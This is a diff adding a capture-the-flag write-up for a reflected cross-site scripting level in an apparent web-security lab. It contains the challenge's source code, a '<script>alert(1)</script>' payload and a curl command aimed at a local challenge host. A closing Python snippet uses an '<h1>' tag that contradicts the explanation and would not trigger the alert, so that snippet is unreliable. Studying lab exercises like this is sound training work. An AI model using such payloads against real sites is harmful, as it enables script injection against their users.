@@ -677,3 +677,64 @@ while True:
 if not found:
         break
 ```
+
+&nbsp;
+
+## level 8
+
+> Exploit a cross site scripting vulnerability
+
+```py title="level 8 source code"
+def level8():
+    if request.path == "/echo":
+        echo = request.args.get("echo")
+        assert echo, "Missing `echo` argument"
+        return html(echo)
+
+    if request.path == "/visit":
+        url = request.args.get("url")
+        assert url, "Missing `url` argument"
+
+        url_arg_parsed = urllib.parse.urlparse(url)
+        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"
+
+        with run_browser() as browser:
+            browser.get(url)
+            try:
+                WebDriverWait(browser, 1).until(EC.alert_is_present())
+            except TimeoutException:
+                return "Failed to alert\n"
+            else:
+                return f"{flag}\n"
+
+    return "Not Found\n", 404
+```
+
+This level takes the `echo` argument and return HTML generated with that argument.
+
+It then checks if there is an alert on the page. If yes, it returns the flag.
+
+### Cross-Site Scripting (XSS)
+
+We can generate an alert using a `<script>` tag. Anything we put within the tag is treated as a script and executed.
+
+```
+<script>alert(1)</script>
+```
+
+```
+hacker@web-security~level8:/$ curl 'http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=<script>alert(1)</script>'
+```
+
+```py
+import requests
+
+response = requests.get("http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=<h1>alert(1)</h1>")
+print(response.text)
+```
+
+&nbsp;
+
+## level 9
+
+>
